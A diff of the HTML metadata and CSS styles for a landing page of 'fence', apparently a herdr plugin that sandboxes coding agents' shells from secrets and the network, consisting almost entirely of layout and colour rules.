@@ -4,9 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>fence</title>
-<meta name="description" content="fence turns a herdr space into a pen: every shell in it can write its own folder, reach the domains you allow, and nothing else.">
+<meta name="description" content="fence turns a herdr space into a pen: every shell in it can write its own folder, reach the domains you allow, and nothing else. Seatbelt on macOS, bubblewrap on Linux.">
 <meta property="og:title" content="fence: pens for your agents">
-<meta property="og:description" content="A herdr plugin that fences your coding agents off from your secrets and the network. Seatbelt on macOS, bubblewrap on Linux.">
+<meta property="og:description" content="A herdr plugin that fences your coding agents off from your secrets, your machine and the open internet.">
 <meta name="theme-color" content="#0B1422">
 <link rel="icon" href="icon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -23,13 +23,23 @@
   --subtle: #5D6E87;
   --amber: #F5B544;
   --amber-hi: #FFD27A;
+  --red: #F87171;
+  --red-hi: #FCA5A5;
+  --green: #4ADE80;
+  --green-hi: #86EFAC;
+  --cyan: #22D3EE;
   --wood: #B98A55;
   --wood-dark: #6E4E2E;
-  --red: #F87171;
-  --red-soft: #FCA5A5;
-  --green: #4ADE80;
-  --cyan: #22D3EE;
-  --term: #070D17;
+  --claude: #D97757;
+  /* herdr's own window, used for the terminal mocks */
+  --t-bg: #15141B;
+  --t-bar: #1C1B23;
+  --t-side: #18171F;
+  --t-line: #2A2933;
+  --t-text: #E6E4EE;
+  --t-muted: #8E8BA0;
+  --t-subtle: #5D5A6E;
+  --t-sel: #2C2A38;
   --sans: "Schibsted Grotesk", ui-sans-serif, system-ui, sans-serif;
   --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
   --ease: cubic-bezier(.2, .8, .2, 1);
@@ -37,18 +47,14 @@
 }
 * { box-sizing: border-box; }
 html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
-body {
-  margin: 0; background: var(--night); color: var(--ink);
-  font-family: var(--sans); font-size: 17px; line-height: 1.55;
-  -webkit-font-smoothing: antialiased; overflow-x: clip;
-}
+body { margin: 0; background: var(--night); color: var(--ink); font-family: var(--sans); font-size: 17px; line-height: 1.55; -webkit-font-smoothing: antialiased; overflow-x: clip; }
 a { color: inherit; }
 ::selection { background: var(--amber); color: #1a1205; }
 code, .mono { font-family: var(--mono); font-size: .88em; }
 .wrap { width: min(1160px, 100% - 32px); margin-inline: auto; }
 
 /* ---------- nav ---------- */
-.nav { position: fixed; inset: 0 0 auto; z-index: 50; transition: background .3s, border-color .3s; border-bottom: 1px solid transparent; }
+.nav { position: fixed; inset: 0 0 auto; z-index: 50; transition: background .3s, border-color .3s, backdrop-filter .3s; border-bottom: 1px solid transparent; }
 .nav.scrolled { background: rgba(11, 20, 34, .72); backdrop-filter: blur(14px) saturate(1.4); -webkit-backdrop-filter: blur(14px) saturate(1.4); border-color: var(--line); }
 .nav .wrap { display: flex; align-items: center; justify-content: space-between; height: 64px; }
 .brand { display: flex; align-items: center; gap: 10px; text-decoration: none; font-weight: 700; font-size: 18px; letter-spacing: -.01em; }
@@ -62,23 +68,28 @@ code, .mono { font-family: var(--mono); font-size: .88em; }
 
 /* ---------- hero ---------- */
 .hero { position: relative; min-height: 100svh; display: flex; align-items: center; overflow: hidden; padding: 96px 0 64px; }
-#field { position: absolute; inset: 0; width: 100%; height: 100%; display: block; touch-action: pan-y; }
+#field { position: absolute; inset: 0; width: 100%; height: 100%; display: block; }
 .hero::after {
   content: ""; position: absolute; inset: 0; pointer-events: none;
   background:
-    linear-gradient(90deg, rgba(11,20,34,.94) 0%, rgba(11,20,34,.7) 40%, rgba(11,20,34,0) 58%),
+    linear-gradient(90deg, rgba(11,20,34,.93) 0%, rgba(11,20,34,.6) 40%, rgba(11,20,34,0) 56%),
     linear-gradient(0deg, var(--night) 0%, rgba(11,20,34,0) 10%);
 }
-.hero .wrap { position: relative; z-index: 2; pointer-events: none; }
-.hero .copy { max-width: 560px; pointer-events: auto; }
+.hero .wrap { position: relative; z-index: 2; display: grid; grid-template-columns: 1fr 1fr; gap: 110px; align-items: center; pointer-events: none; }
+.hero .wrap > * { pointer-events: auto; min-width: 0; }
 .eyebrow { font-family: var(--mono); font-size: 13px; color: var(--muted); letter-spacing: .02em; margin: 0 0 22px; display: flex; gap: 10px; align-items: center; }
-.eyebrow .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--amber); animation: ping 1.8s infinite; }
+.eyebrow .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--red); animation: ping 1.6s infinite; }
 .eyebrow a { color: var(--ink); text-decoration-color: var(--subtle); text-underline-offset: 3px; }
-@keyframes ping { 0% { box-shadow: 0 0 0 0 rgba(245,181,68,.55); } 80%, 100% { box-shadow: 0 0 0 9px rgba(245,181,68,0); } }
-h1 { font-size: clamp(44px, 6.4vw, 86px); line-height: .98; letter-spacing: -.035em; font-weight: 800; margin: 0; text-wrap: balance; }
+@keyframes ping { 0% { box-shadow: 0 0 0 0 rgba(248,113,113,.55); } 80%, 100% { box-shadow: 0 0 0 9px rgba(248,113,113,0); } }
+h1 { font-size: clamp(38px, 4.6vw, 66px); line-height: 1; letter-spacing: -.035em; font-weight: 800; margin: 0; min-height: 3.05em; text-wrap: balance; }
 h1 .line { display: block; }
+h1 .who { transition: color .4s; }
+h1 .what { font-family: var(--mono); font-weight: 700; font-size: .66em; letter-spacing: -.04em; color: var(--red-hi); display: inline-block; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; vertical-align: bottom; }
 h1 .hl { color: var(--amber); }
-.lede { font-size: clamp(17px, 1.6vw, 20px); color: var(--muted); max-width: 31em; margin: 28px 0 32px; }
+h1 .swap { display: inline-block; transition: opacity .35s var(--ease), transform .45s var(--ease), filter .35s; }
+h1.leaving .swap { opacity: 0; transform: translateY(-.25em); filter: blur(6px); }
+h1.entering .swap { opacity: 0; transform: translateY(.3em); filter: blur(6px); transition: none; }
+.lede { font-size: clamp(17px, 1.6vw, 20px); color: var(--muted); max-width: 29em; margin: 28px 0 32px; }
 .lede strong { color: var(--ink); font-weight: 600; }
 .cta { display: flex; gap: 12px; flex-wrap: wrap; }
 .btn { display: inline-flex; align-items: center; gap: 10px; text-decoration: none; font-weight: 600; font-size: 16px; padding: 13px 22px; border-radius: 999px; border: 1px solid var(--line); transition: transform .2s var(--ease), background .2s, border-color .2s; }
@@ -87,21 +98,50 @@ h1 .hl { color: var(--amber); }
 .btn.primary:hover { background: var(--amber-hi); }
 .btn .arrow { transition: transform .2s var(--ease); }
 .btn:hover .arrow { transform: translateX(3px); }
-.works { margin: 28px 0 0; font-size: 14px; color: var(--subtle); max-width: 30em; }
-.works span { color: var(--ink); font-weight: 500; }
+.works { margin: 28px 0 0; font-size: 14px; color: var(--subtle); display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
+.works span { color: var(--ink); font-weight: 500; display: inline-flex; gap: 7px; align-items: center; }
+.works svg { width: 16px; height: 16px; flex: none; }
 .hint { position: absolute; z-index: 2; bottom: 22px; left: 50%; transform: translateX(-50%); font-family: var(--mono); font-size: 12px; color: var(--subtle); white-space: nowrap; pointer-events: none; transition: opacity .6s; }
 
-/* a herdr toast, bottom right of the hero */
-.toast {
-  position: absolute; z-index: 3; right: 24px; bottom: 64px; width: min(320px, calc(100% - 32px));
-  background: rgba(14, 26, 43, .92); border: 1px solid var(--line); border-radius: 12px; padding: 11px 14px;
-  font-family: var(--mono); font-size: 12.5px; color: var(--ink); box-shadow: 0 20px 50px -20px rgba(0,0,0,.8);
-  opacity: 0; transform: translateY(10px); transition: opacity .35s var(--ease), transform .45s var(--ease); pointer-events: none;
-  backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
-}
+/* ---------- a herdr window ---------- */
+.hwin { position: relative; border-radius: 14px; background: var(--t-bg); border: 1px solid rgba(255,255,255,.08); overflow: hidden; font-family: var(--mono); font-size: 12px; line-height: 1.6; color: var(--t-text);
+  box-shadow: 0 0 0 1px rgba(0,0,0,.4), 0 50px 100px -30px rgba(0,0,0,.85), 0 30px 70px -40px rgba(245,181,68,.18); }
+.hwin .tb { height: 34px; display: flex; align-items: center; gap: 7px; padding: 0 13px; background: var(--t-bar); border-bottom: 1px solid var(--t-line); color: var(--t-subtle); font-size: 11.5px; }
+.hwin .tb i { width: 11px; height: 11px; border-radius: 50%; background: #2E2D38; }
+.hwin .tb span { margin-left: 8px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+.hwin .tb b { color: var(--t-muted); font-weight: 500; }
+.c-g { color: var(--green); } .c-gh { color: var(--green-hi); } .c-r { color: var(--red); } .c-rh { color: var(--red-hi); } .c-a { color: var(--amber); } .c-d { color: var(--t-subtle); } .c-m { color: var(--t-muted); } .c-c { color: var(--cyan); } .c-b { font-weight: 700; color: var(--t-text); } .c-o { color: var(--claude); }
+.kc { color: var(--t-subtle); } .kc b { color: var(--cyan); font-weight: 700; }
+
+/* the hero's herdr: sidebar, one pane, the tab bar, a toast */
+.hero-win { width: 100%; max-width: 520px; justify-self: end; }
+.hw-body { display: grid; grid-template-columns: 150px 1fr; height: 372px; }
+.hw-side { background: var(--t-side); border-right: 1px solid var(--t-line); padding: 12px 0; font-size: 11.5px; overflow: hidden; }
+.hw-side h5 { margin: 0 0 6px; padding: 0 14px; font-size: 10.5px; font-weight: 500; color: var(--t-subtle); text-transform: uppercase; letter-spacing: .06em; }
+.hw-side .ws { display: flex; align-items: center; gap: 7px; padding: 4px 14px; color: var(--t-muted); white-space: nowrap; }
+.hw-side .ws.on { background: var(--t-sel); color: var(--t-text); box-shadow: inset 2px 0 0 var(--amber); }
+.hw-side .ws .st { margin-left: auto; width: 7px; height: 7px; border-radius: 50%; background: var(--t-subtle); flex: none; }
+.hw-side .ws .st.working { background: #60A5FA; animation: pulse 1.4s ease-in-out infinite; }
+.hw-side .ws .st.done { background: var(--green); }
+.hw-side .sep { height: 14px; }
+.hw-side .ag { display: flex; align-items: center; gap: 7px; padding: 3px 14px; color: var(--t-muted); white-space: nowrap; }
+.hw-side .ag svg { width: 12px; height: 12px; flex: none; }
+@keyframes pulse { 50% { opacity: .35; } }
+.hw-pane { position: relative; padding: 12px 14px; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; }
+.hw-pane .ln { white-space: pre-wrap; overflow-wrap: anywhere; animation: lnIn .3s var(--ease); }
+@keyframes lnIn { from { opacity: 0; transform: translateY(4px); } }
+.hw-pane .gap { height: 8px; }
+.hw-pane .spin { display: inline-block; width: 1ch; color: var(--claude); }
+.hw-tabs { height: 26px; display: flex; align-items: center; gap: 2px; padding: 0 8px; border-top: 1px solid var(--t-line); background: var(--t-bar); font-size: 11px; color: var(--t-subtle); white-space: nowrap; overflow: hidden; }
+.hw-tabs .t { padding: 1px 8px; border-radius: 4px; }
+.hw-tabs .t.on { background: var(--t-sel); color: var(--t-text); }
+.hw-tabs .r { margin-left: auto; display: flex; gap: 10px; align-items: center; }
+.hw-tabs .r .pen { color: var(--green); }
+.toast { position: absolute; z-index: 3; top: 44px; right: 10px; width: 250px; background: #24232D; border: 1px solid #3A3846; border-radius: 9px; padding: 9px 12px; font-size: 11.5px; line-height: 1.45; box-shadow: 0 16px 40px -12px rgba(0,0,0,.8);
+  opacity: 0; transform: translateX(16px); transition: opacity .3s var(--ease), transform .45s var(--ease); pointer-events: none; }
 .toast.on { opacity: 1; transform: none; }
-.toast b { display: block; font-weight: 500; margin-bottom: 2px; }
-.toast span { color: var(--muted); font-size: 11.5px; }
+.toast b { display: block; color: var(--t-text); font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.toast span { color: var(--t-muted); }
 
 /* ---------- sections ---------- */
 section.block { position: relative; padding: clamp(80px, 12vw, 150px) 0; }
@@ -113,99 +153,195 @@ h2 .dim { color: var(--subtle); }
 .body { color: var(--muted); font-size: 18px; max-width: 32em; }
 .body p { margin: 0 0 16px; }
 .body strong { color: var(--ink); font-weight: 600; }
+.body code { color: var(--ink); }
 .keys { list-style: none; padding: 0; margin: 30px 0 0; display: grid; gap: 14px; }
-.keys li { display: grid; grid-template-columns: 120px 1fr; gap: 16px; align-items: baseline; color: var(--muted); font-size: 16px; padding-top: 14px; border-top: 1px solid var(--line); }
+.keys li { display: grid; grid-template-columns: 110px 1fr; gap: 16px; align-items: baseline; color: var(--muted); font-size: 16px; padding-top: 14px; border-top: 1px solid var(--line); }
 .keys li code { color: var(--ink); font-size: 13px; }
+.sec-note { margin: 22px 0 0; color: var(--subtle); font-size: 14.5px; max-width: 46em; }
+.sec-note a { color: var(--muted); }
+.sec-note code { color: var(--muted); }
+
+/* word reveal */
+.rv .w { display: inline-block; overflow: hidden; vertical-align: top; padding-bottom: .08em; margin-bottom: -.08em; }
+.rv .w > span { display: inline-block; transform: translateY(105%); transition: transform .9s var(--ease); transition-delay: calc(var(--i) * 45ms); }
+.rv.in .w > span { transform: none; }
 .fade { opacity: 0; transform: translateY(24px); transition: opacity .9s var(--ease), transform .9s var(--ease); transition-delay: var(--d, 0ms); }
 .fade.in { opacity: 1; transform: none; }
 
-/* ---------- terminals ---------- */
-.shell { border-radius: 18px; border: 1px solid var(--line); background: var(--term); overflow: hidden; box-shadow: 0 40px 80px -40px rgba(0,0,0,.8); }
-.shell .bar { display: flex; align-items: center; gap: 7px; padding: 12px 16px; border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--subtle); }
-.shell .bar i { width: 11px; height: 11px; border-radius: 50%; background: #1E2A3C; }
-.shell .bar span { margin-left: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-.shell pre { margin: 0; padding: 18px 20px 22px; font-family: var(--mono); font-size: 13px; line-height: 1.65; color: #D5DEEA; white-space: pre-wrap; overflow-wrap: anywhere; }
-.c-g { color: var(--green); } .c-r { color: var(--red); } .c-a { color: var(--amber); } .c-d { color: var(--subtle); } .c-c { color: var(--cyan); } .c-b { font-weight: 700; color: var(--ink); }
-.cursor { display: inline-block; width: .6em; height: 1.1em; vertical-align: -0.2em; background: var(--amber); animation: blink 1s steps(1) infinite; }
-@keyframes blink { 50% { opacity: 0; } }
-#attempts { min-height: 430px; }
+/* ---------- the ways out ---------- */
+.routes-top { display: grid; grid-template-columns: 1fr; gap: 26px; margin-bottom: 40px; }
+.seg { display: inline-flex; flex-wrap: wrap; padding: 4px; border-radius: 999px; border: 1px solid var(--line); background: rgba(255,255,255,.02); justify-self: start; }
+.seg button { font: inherit; font-size: 14px; color: var(--muted); background: none; border: 0; padding: 9px 16px; border-radius: 999px; cursor: pointer; transition: color .2s, background .25s; white-space: nowrap; }
+.seg button:hover { color: var(--ink); }
+.seg button.on { background: var(--ink); color: var(--night); font-weight: 600; }
+.map { position: relative; border: 1px solid var(--line); border-radius: 24px; padding: 34px clamp(16px, 3vw, 36px); background: radial-gradient(120% 140% at 50% 0%, rgba(245,181,68,.05), transparent 60%), rgba(255,255,255,.012); }
+.map-grid { display: grid; grid-template-columns: 120px 1fr 120px; align-items: center; gap: 0 18px; }
+.node { text-align: center; font-size: 13px; color: var(--muted); }
+.node .ico { width: 64px; height: 64px; margin: 0 auto 10px; border-radius: 18px; display: grid; place-items: center; border: 1px solid var(--line); background: var(--night-2); color: var(--ink); transition: border-color .4s, box-shadow .4s; }
+.node .ico svg { width: 30px; height: 30px; }
+.node b { display: block; color: var(--ink); font-family: var(--mono); font-size: 12.5px; font-weight: 500; }
+.node.lit .ico { border-color: rgba(74,222,128,.55); box-shadow: 0 0 40px -6px rgba(74,222,128,.4); }
+.node.hit .ico { border-color: rgba(248,113,113,.5); box-shadow: 0 0 40px -6px rgba(248,113,113,.35); }
+.lanes { position: relative; display: grid; gap: 22px; }
+.lane { position: relative; height: 46px; }
+.lane .lbl { position: absolute; left: 0; right: 0; top: 0; display: flex; justify-content: space-between; font-family: var(--mono); font-size: 12px; color: var(--muted); gap: 12px; }
+.lane .lbl b { color: var(--ink); font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.lane .res { font-weight: 500; white-space: nowrap; transition: color .3s; flex: none; }
+.lane .track { position: absolute; left: 0; right: 0; bottom: 8px; height: 2px; background: repeating-linear-gradient(90deg, var(--line) 0 6px, transparent 6px 11px); border-radius: 2px; }
+.lane .fill { position: absolute; left: 0; right: 0; bottom: 8px; height: 2px; border-radius: 2px; background: linear-gradient(90deg, var(--green), var(--green-hi)); transform-origin: left; transform: scaleX(0); box-shadow: 0 0 14px rgba(74,222,128,.6); }
+.lane .stub { position: absolute; left: 0; width: var(--fence); bottom: 8px; height: 2px; border-radius: 2px; background: linear-gradient(90deg, rgba(248,113,113,.2), var(--red)); transform-origin: left; transform: scaleX(0); }
+.lane .pk { position: absolute; bottom: 4px; left: 0; width: 10px; height: 10px; margin-left: -5px; border-radius: 50%; background: var(--ink); box-shadow: 0 0 12px var(--ink); opacity: 0; }
+.lane .boom { position: absolute; bottom: -6px; left: var(--fence); width: 30px; height: 30px; margin-left: -15px; border-radius: 50%; border: 2px solid var(--red); opacity: 0; }
+.lane.ok .res, .lane.ok .lbl b { color: var(--green-hi); }
+.lane.no .res { color: var(--red-hi); }
+.lane.no .lbl b { color: var(--muted); }
+/* the fence across every lane */
+.lanes::before { content: ""; position: absolute; top: -12px; bottom: -6px; left: var(--fence); width: 12px; margin-left: -6px; z-index: 1; pointer-events: none;
+  background:
+    linear-gradient(90deg, transparent 0 2px, var(--wood-dark) 2px 10px, transparent 10px) center / 12px 100% no-repeat,
+    repeating-linear-gradient(180deg, transparent 0 18px, var(--wood) 18px 22px, transparent 22px 40px);
+  border-radius: 4px; filter: drop-shadow(0 2px 2px rgba(0,0,0,.5)); }
+.lanes::after { content: "fence"; position: absolute; top: -34px; left: var(--fence); transform: translateX(-50%); font-family: var(--mono); font-size: 11px; color: var(--wood); }
+.map-cap { margin: 30px 0 0; text-align: center; color: var(--muted); min-height: 1.6em; transition: opacity .3s; }
+.map-cap b { color: var(--ink); font-weight: 600; }
+.sees { margin-top: 26px; display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.sbox { border: 1px solid var(--line); border-radius: 18px; padding: 18px 20px; overflow: hidden; background: rgba(255,255,255,.012); min-height: 104px; }
+.sbox h4 { margin: 0 0 10px; font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--subtle); }
+.sbox .out { font-family: var(--mono); font-size: 13.5px; color: var(--ink); white-space: pre-wrap; overflow-wrap: anywhere; transition: opacity .3s; }
+.sbox .out .c-d { color: var(--subtle); }
 
-/* the pen window */
-.tui pre { min-height: 400px; font-size: 12.5px; white-space: pre; overflow-x: auto; scrollbar-width: thin; }
-.tui .tabs { display: flex; gap: 4px; padding: 10px 14px 0; flex-wrap: wrap; }
-.tui .tabs button { font: inherit; font-family: var(--mono); font-size: 12.5px; color: var(--subtle); background: none; border: 0; padding: 6px 10px; border-radius: 8px; cursor: pointer; }
-.tui .tabs button.on { color: var(--ink); background: rgba(255,255,255,.06); }
-.tui .tabs button kbd { font: inherit; color: var(--cyan); }
-.tui .row { display: block; border-radius: 4px; cursor: pointer; }
-.tui .row:hover { background: rgba(255,255,255,.04); }
-.tui .row.sel { background: rgba(34, 211, 238, .08); }
-.tui .act { font: inherit; color: var(--cyan); background: rgba(34,211,238,.1); border: 1px solid rgba(34,211,238,.3); border-radius: 6px; padding: 0 7px; cursor: pointer; }
+/* ---------- gates: the pen window ---------- */
+.pwin pre { margin: 0; padding: 14px 4px 14px 0; min-height: 392px; font: inherit; white-space: pre; overflow-x: auto; scrollbar-width: none; }
+.pwin .row { display: inline-block; width: 100%; cursor: pointer; transition: background .2s; }
+.pwin .row:hover { background: rgba(255,255,255,.03); }
+.pwin .row.sel { background: rgba(34,211,238,.07); }
+.pwin .row.gone { animation: rowOut .45s var(--ease) forwards; }
+@keyframes rowOut { to { opacity: 0; transform: translateX(14px); } }
+.pwin .row.new { animation: lnIn .45s var(--ease); }
+.pwin .tab { cursor: pointer; }
+.pwin .toast { top: 44px; }
+.press { display: inline-block; color: var(--night); background: var(--cyan); border-radius: 4px; padding: 0 5px; font-weight: 700; animation: press .6s var(--ease); }
+@keyframes press { from { transform: scale(1.5); opacity: 0; } }
 
-/* how: macOS / Linux */
-.how { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin-top: 46px; }
-.card { border: 1px solid var(--line); border-radius: 18px; padding: 26px 26px 22px; background: linear-gradient(180deg, rgba(255,255,255,.025), rgba(255,255,255,0)); }
-.card h3 { margin: 0 0 4px; font-size: 22px; letter-spacing: -.01em; }
-.card .sub { font-family: var(--mono); font-size: 12.5px; color: var(--amber); margin: 0 0 16px; }
-.card dl { margin: 0; display: grid; grid-template-columns: 92px 1fr; gap: 10px 14px; font-size: 15px; }
-.card dt { color: var(--subtle); font-family: var(--mono); font-size: 12.5px; padding-top: 2px; }
-.card dd { margin: 0; color: var(--muted); }
-.card dd code { color: var(--ink); }
+/* ---------- how ---------- */
+.viewsw { position: relative; display: inline-flex; padding: 4px; border-radius: 999px; border: 1px solid var(--line); background: rgba(255,255,255,.02); margin-bottom: 18px; }
+.viewsw .knob { position: absolute; top: 4px; bottom: 4px; left: 0; border-radius: 999px; background: var(--ink); transition: transform .45s var(--ease), width .45s var(--ease); }
+.viewsw button { position: relative; z-index: 1; display: inline-flex; align-items: center; gap: 8px; font: inherit; font-size: 14px; font-weight: 600; color: var(--muted); background: none; border: 0; padding: 9px 18px; border-radius: 999px; cursor: pointer; transition: color .3s; }
+.viewsw button.on { color: var(--night); }
+.viewsw svg { width: 15px; height: 15px; }
+.code { border-radius: 16px; border: 1px solid var(--line); background: #070D17; overflow: hidden; box-shadow: 0 40px 80px -40px rgba(0,0,0,.8); }
+.code .bar { display: flex; align-items: center; gap: 7px; padding: 11px 16px; border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--subtle); }
+.code .bar i { width: 11px; height: 11px; border-radius: 50%; background: #1E2A3C; }
+.code .bar span { margin-left: 8px; }
+.code pre { margin: 0; padding: 16px 18px 18px; font-family: var(--mono); font-size: 12px; line-height: 1.65; color: #C9D3E0; white-space: pre; overflow-x: auto; min-height: 430px; scrollbar-width: thin; }
+.code pre[hidden] { display: none; }
+.code .k { color: var(--cyan); } .code .s { color: var(--amber-hi); } .code .cm { color: var(--subtle); font-style: italic; } .code .f { color: var(--red-hi); } .code .ok { color: var(--green-hi); }
+.facts { list-style: none; padding: 0; margin: 30px 0 0; display: grid; gap: 0; }
+.facts li { padding: 14px 0; border-top: 1px solid var(--line); color: var(--muted); font-size: 16px; display: grid; grid-template-columns: 110px 1fr; gap: 16px; }
+.facts li b { font-family: var(--mono); font-size: 12.5px; font-weight: 500; color: var(--ink); padding-top: 3px; }
 
-/* the six fences */
-.grid6 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; margin-top: 46px; }
-.grid6 .card h3 { font-size: 18px; display: flex; gap: 10px; align-items: center; }
-.grid6 .card h3 svg { width: 20px; height: 20px; color: var(--amber); flex: none; }
-.grid6 .card p { margin: 8px 0 0; color: var(--muted); font-size: 15px; }
-.grid6 .card code { color: var(--ink); font-size: 12.5px; }
+/* ---------- profiles + limits: columns with rules between ---------- */
+.feats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 34px 0; margin-top: 46px; border-top: 1px solid var(--line); padding-top: 30px; }
+.feats > div { padding: 0 26px; border-left: 1px solid var(--line); }
+.feats > div:first-child { padding-left: 0; border-left: 0; }
+.feats h3 { margin: 0 0 6px; font-size: 20px; letter-spacing: -.01em; display: flex; align-items: baseline; gap: 10px; }
+.feats h3 small { font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--amber); }
+.feats p { margin: 0; color: var(--muted); font-size: 15.5px; }
+.feats .meter { margin-top: 18px; display: flex; gap: 3px; }
+.feats .meter i { height: 6px; flex: 1; border-radius: 3px; background: rgba(255,255,255,.07); }
+.feats .meter i.on { background: var(--amber); }
+.feats .dom { margin-top: 12px; font-family: var(--mono); font-size: 12px; color: var(--subtle); line-height: 1.7; }
+.feats .dom b { color: var(--muted); font-weight: 400; }
+.limits { grid-template-columns: repeat(2, 1fr); }
+.limits > div:nth-child(odd) { padding-left: 0; border-left: 0; }
+.limits h3 { font-size: 18px; }
+.toml { margin-top: 30px; }
+.toml pre { min-height: 0; }
 
-/* honest */
-.limits { list-style: none; padding: 0; margin: 34px 0 0; display: grid; gap: 0; max-width: 820px; }
-.limits li { padding: 18px 0; border-top: 1px solid var(--line); color: var(--muted); font-size: 16px; display: grid; grid-template-columns: 28px 1fr; gap: 10px; }
-.limits li::before { content: "∴"; color: var(--amber); font-family: var(--mono); }
-.limits b { color: var(--ink); font-weight: 600; }
-
-/* setup */
+/* ---------- setup ---------- */
 .install .split { align-items: start; }
 .steps { list-style: none; counter-reset: s; padding: 0; margin: 34px 0 0; display: grid; gap: 22px; }
 .steps li { counter-increment: s; display: grid; grid-template-columns: 40px minmax(0, 1fr); gap: 14px; color: var(--muted); }
 .steps li::before { content: counter(s); width: 32px; height: 32px; border-radius: 50%; border: 1px solid var(--line); display: grid; place-items: center; font-family: var(--mono); font-size: 13px; color: var(--ink); }
 .steps b { color: var(--ink); font-weight: 600; display: block; }
-.cmd { margin-top: 8px; display: flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 13px; background: rgba(255,255,255,.04); border: 1px solid var(--line); border-radius: 10px; padding: 9px 9px 9px 13px; color: var(--ink); }
-.cmd code { flex: 1; overflow-x: auto; white-space: pre; font-size: 13px; scrollbar-width: none; }
+.steps code { color: var(--ink); }
+.cmd { margin-top: 8px; display: flex; align-items: flex-start; gap: 8px; font-family: var(--mono); font-size: 13px; background: rgba(255,255,255,.04); border: 1px solid var(--line); border-radius: 10px; padding: 9px 9px 9px 13px; color: var(--ink); }
+.cmd code { flex: 1; overflow-x: auto; white-space: pre; font-size: 13px; scrollbar-width: none; padding-top: 3px; }
 .cmd button { font: inherit; font-size: 11.5px; background: none; border: 1px solid var(--line); color: var(--muted); border-radius: 7px; padding: 4px 9px; cursor: pointer; flex: none; transition: color .2s, border-color .2s; }
 .cmd button:hover { color: var(--ink); border-color: rgba(160,185,220,.35); }
 .reqs { margin-top: 28px; font-size: 14.5px; color: var(--subtle); }
-.reqs a { color: var(--muted); }
-#setupShell { min-height: 360px; }
+.reqs a, .reqs code { color: var(--muted); }
+.shell { border-radius: 18px; border: 1px solid var(--line); background: #070D17; overflow: hidden; box-shadow: 0 40px 80px -40px rgba(0,0,0,.8); transition: background .4s; }
+.shell.herdr { background: var(--t-bg); }
+.shell .bar { display: flex; align-items: center; gap: 7px; padding: 12px 16px; border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--subtle); }
+.shell .bar i { width: 11px; height: 11px; border-radius: 50%; background: #1E2A3C; }
+.shell .bar span { margin-left: 8px; }
+.shell pre { margin: 0; padding: 18px 20px 22px; font-family: var(--mono); font-size: 13px; line-height: 1.6; color: #D5DEEA; min-height: 520px; white-space: pre-wrap; overflow-wrap: anywhere; }
+.shell .p { color: var(--amber); }
+.shell .k { color: var(--subtle); }
+.caret { display: inline-block; width: .6em; height: 1.15em; background: var(--amber); vertical-align: text-bottom; animation: blink 1s steps(1) infinite; }
+@keyframes blink { 50% { opacity: 0; } }
 
-/* footer */
-footer { position: relative; padding: 90px 0 40px; border-top: 1px solid var(--line); background: linear-gradient(180deg, var(--night) 0%, #070D17 100%); overflow: hidden; }
-footer .big { font-size: clamp(40px, 7vw, 96px); font-weight: 800; letter-spacing: -.04em; line-height: .95; margin: 0; max-width: 9em; }
+/* ---------- footer ---------- */
+footer { position: relative; padding: 90px 0 40px; overflow: hidden; border-top: 1px solid var(--line); background: linear-gradient(180deg, var(--night) 0%, #070D17 100%); min-height: 420px; }
+footer .big { font-size: clamp(40px, 7vw, 96px); font-weight: 800; letter-spacing: -.04em; line-height: .95; margin: 0; max-width: 8em; position: relative; z-index: 2; }
 footer .big .hl { color: var(--amber); }
-footer .links { margin-top: 40px; display: flex; gap: 22px; flex-wrap: wrap; font-size: 15px; color: var(--muted); }
+footer .links { margin-top: 40px; display: flex; gap: 22px; flex-wrap: wrap; font-size: 15px; color: var(--muted); position: relative; z-index: 2; }
 footer .links a { color: var(--muted); text-decoration: none; }
 footer .links a:hover { color: var(--ink); }
-footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px, 70vw); opacity: .5; pointer-events: none; }
+#peek { position: absolute; right: max(16px, calc(50% - 600px)); bottom: -6px; width: min(520px, 58vw); height: auto; }
+#peek .lid { transform-box: fill-box; transform-origin: center; transition: transform .08s; }
 
-@media (max-width: 900px) {
-  .split, .how { grid-template-columns: 1fr; }
-  .grid6 { grid-template-columns: 1fr 1fr; }
-  .hero { align-items: flex-start; padding-top: 110px; min-height: max(100svh, 860px); }
-  .hero::after { background: linear-gradient(0deg, var(--night) 0%, rgba(11,20,34,0) 8%); }
-  .toast { right: 16px; bottom: 56px; }
+@media (max-width: 1080px) {
+  .hw-body { grid-template-columns: 1fr; }
+  .hw-side { display: none; }
 }
-@media (max-width: 640px) {
-  .grid6 { grid-template-columns: 1fr; }
-  .keys li { grid-template-columns: 1fr; gap: 4px; }
-  .card dl { grid-template-columns: 1fr; gap: 2px; }
-  .card dd { margin-bottom: 10px; }
-  .shell pre { font-size: 12px; padding: 16px; }
-  .tui pre { font-size: 11px; }
+@media (max-width: 900px) {
+  .hero .wrap, .split { grid-template-columns: 1fr; }
+  .hero { padding-top: 110px; padding-bottom: 90px; }
+  .hero .wrap { gap: 70px; }
